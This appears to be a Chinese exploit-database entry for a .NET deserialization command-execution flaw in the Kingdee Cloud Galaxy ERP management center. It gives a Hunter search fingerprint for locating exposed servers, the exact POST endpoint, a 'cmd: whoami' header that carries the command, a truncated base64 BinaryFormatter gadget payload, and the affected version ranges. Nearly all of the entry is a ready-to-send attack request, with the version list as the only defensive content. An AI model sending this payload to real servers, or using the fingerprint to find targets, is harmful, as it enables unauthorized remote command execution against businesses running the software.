# 金蝶云星空管理中心RecordCurDevCodeInfo反序列化命令执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：`app.name="Kingdee 金蝶云星空"``
- **请求**：`POST /Kingdee.BOS.ServiceFacade.ServicesStub.AppDesigner.AppDesignerService.RecordCurDevCodeInfo.common.kdsvc HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 15907`　`Content-Type: text/json`　`cmd: whoami`

**请求体 / payload**
```
{"ap0":"AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAA…（脚本共 16053 字，完整版见原文）
```

**其他**
- 金蝶云星空管理中心RecordCurDevCodeInfo反序列化命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 6.x版本：低于6.2.1012.4
* 7.x版本：7.0.352.16 至 7.7.0.202111
* 8.x版本：8.0.0.202205 至 8.1.0.20221110